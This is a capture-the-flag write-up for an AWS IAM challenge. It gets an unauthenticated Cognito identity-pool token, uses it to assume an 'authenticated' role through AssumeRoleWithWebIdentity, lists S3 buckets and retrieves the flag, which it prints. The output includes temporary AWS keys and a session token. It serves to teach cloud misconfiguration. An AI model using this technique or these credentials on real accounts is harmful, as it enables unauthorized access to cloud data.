---
tags:
  - IAM
  - Cognito
  - OIDC
title: THE BIG IAM Challenge - One final push
description: IAM is too open to OIDC
reference: https://thebigiamchallenge.com/challenge/6
---
## Challenge

Anonymous access no more. Let's see what can you do now.

Now try it with the authenticated role: _arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role_

## Solution

### 1. View the provided IAM Policy

This role can be assumed by the open id token where the token 
- is issused by `cognito-identity.amazonaws.com`
- and audience is `us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b`

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "Federated": "cognito-identity.amazonaws.com" }, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b" } } } ] }
```


### 2. Try to get an open id token

The commands to get the open id token:

```
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

{

    "IdentityId": "us-east-1:157d6171-ee37-c0dd-c6c5-ce7afc0154ab"

}

> aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-ee37-c0dd-c6c5-ce7afc0154ab

{

    "IdentityId": "us-east-1:157d6171-ee37-c0dd-c6c5-ce7afc0154ab",

    "Token": "eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWUzNy1jMGRkLWM2YzU

tY2U3YWZjMDE1NGFiIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNz

IjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDgyNzUxNzIsImlhdCI6MTc0ODI3NDU3Mn0.R218RADsPO7owBxVAvn9akG2eiLCh

tfOCs4HuK_2N2a2zno6rL4eBmJd8o40SUYWL9DRP4qX6HWbh5SsQTmHTF0BW9Fy_jT7_PzbQKD1r9wwdw6gGY9IxnZipKNPMyxBKERVQNvMLqVQSgYcGvkPoXoG-X8eJNaWeG

L_MkPvyi6OaNwkGfB6VCt8ej_0RUzx2AB2CZOQNur3LqCnbyeGloUZpJZKl1-LuKKX7z1j3Fnj6ctssUfklv5jvrKI3LT2eE5hL3xcRhJAbsTX2iMEovDqxVj0NG5LYnxUQ72

OKVIOf95QvTW1KaS_lpH9o1e4bdufOAsYDX3HEZ6GFuHu4Q"

}
```

The decoded token:

```
{
  "sub": "us-east-1:157d6171-ee37-c0dd-c6c5-ce7afc0154ab",
  "aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b",
  "amr": [
    "unauthenticated"
  ],
  "iss": "https://cognito-identity.amazonaws.com",
  "exp": 1748275172,
  "iat": 1748274572
}
```


### 3. Try to assume role `Cognito_s3accessAuth_Role` with the above token

```
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name ch6 -

-web-identity-token eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWUzNy1jMGRkL

WM2YzUtY2U3YWZjMDE1NGFiIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXS

wiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDgyNzUxNzIsImlhdCI6MTc0ODI3NDU3Mn0.R218RADsPO7owBxVAvn9akG

2eiLChtfOCs4HuK_2N2a2zno6rL4eBmJd8o40SUYWL9DRP4qX6HWbh5SsQTmHTF0BW9Fy_jT7_PzbQKD1r9wwdw6gGY9IxnZipKNPMyxBKERVQNvMLqVQSgYcGvkPoXoG-X8e

JNaWeGL_MkPvyi6OaNwkGfB6VCt8ej_0RUzx2AB2CZOQNur3LqCnbyeGloUZpJZKl1-LuKKX7z1j3Fnj6ctssUfklv5jvrKI3LT2eE5hL3xcRhJAbsTX2iMEovDqxVj0NG5LY

nxUQ72OKVIOf95QvTW1KaS_lpH9o1e4bdufOAsYDX3HEZ6GFuHu4Q

{

    "Credentials": {

        "AccessKeyId": "ASIARK7LBOHXPBOM3JOI",

        "SecretAccessKey": "EBjsfQxj8LLn3iRVTt8sfYqCrmQcS8ISyul8m+Eo",

        "SessionToken": "FwoGZXIvYXdzEJH//////////wEaDLh5zheH/I3XieHxbyKbAmCnxvw8aq0XP5sk6XbAPWby9ya2ReICe020Uaex4uowak54DpPqjIlCjVww

QWm98RWrHlVSGeuz9nF03HD3FTABLlE6hTqOrXCA5VUIUQsGDLJlidYXFY2A3sN2TaNr3OnximarW4Qp67J44mFMdmq3iyeeBVSKIPQd2soKaM6fDvwm2L5b9t42GXIudPReK

FQz9FfZ1wUXNIOdDE7HiDIHmLiZOaTgWWj95o66qPp7nTtYX6PvaWrLUd2IFaY1i4NLI/xtFQa553vlNtVxyF+o4AeF49pw8bfQFocNQR6B+9iOfL/feRD5rFeKZYj1PZlZVe

XtLXgQdcZ4OnDqkBialCv4Q2JV7+0JSC78tF1gsmXVWfj1UxJHzVkojaDSwQYylgF/3flyyTBmAeljUCGHm90R9ow9ObRVpe2ZmVIF4Cgyy6EeHci4HF/1h00ki5FQfq9eSvD

JrpXXlindi/Uwsi5Uh1u/ZgeTgT1C4w/PULTl4sdVtuXjlekzubIiXBRWeh2PaDKC3NkllTULFf28701LXcuVc0fJ/GgInWS2CMiAZMjEUp0slMzqK4V+7w8nNTPNsscdES0=

",

        "Expiration": "2025-05-26T17:00:13Z"

    },

    "SubjectFromWebIdentityToken": "us-east-1:157d6171-ee37-c0dd-c6c5-ce7afc0154ab",

    "AssumedRoleUser": {

        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:ch6",

        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/ch6"

    },

    "Provider": "cognito-identity.amazonaws.com",

    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"

}
```

### 4. Configure aws cli to use that role 

```
tim@tim-virtual-machine ~/.aws [0|1]> aws sts get-caller-identity
{
    "UserId": "AROARK7LBOHXASFTNOIZG:ch6",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/ch6"
}
```

### 5. Try to access S3 bucket

```
tim@tim-virtual-machine ~/.aws [1]> aws s3 ls
2024-06-06 14:21:35 challenge-website-storage-1fa5073
2024-06-06 16:25:59 payments-system-cd6e4ba
2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 21:28:31 wiz-privatefiles
2023-06-05 21:28:31 wiz-privatefiles-x1000
tim@tim-virtual-machine ~/.aws> aws s3 ls thebigiamchallenge-admin-storage-abf1321

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/ch6 is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321" because no identity-based policy allows the s3:ListBucket action
tim@tim-virtual-machine ~/.aws [255]> aws s3 ls wiz-privatefiles-x1000
2023-06-06 03:42:27       4220 cognito2.png
2023-06-05 21:28:35         40 flag2.txt
tim@tim-virtual-machine ~/.aws> aws s3 cp wiz-privatefiles-x1000/flag2.txt flag2.txt

usage: aws s3 cp <LocalPath> <S3Uri> or <S3Uri> <LocalPath> or <S3Uri> <S3Uri>
Error: Invalid argument type
tim@tim-virtual-machine ~/.aws [255]> aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt flag2.txt
download: s3://wiz-privatefiles-x1000/flag2.txt to ./flag2.txt
tim@tim-virtual-machine ~/.aws> cat flag2.txt
{wiz:open-sesame-or-shell-i-say-openid}
```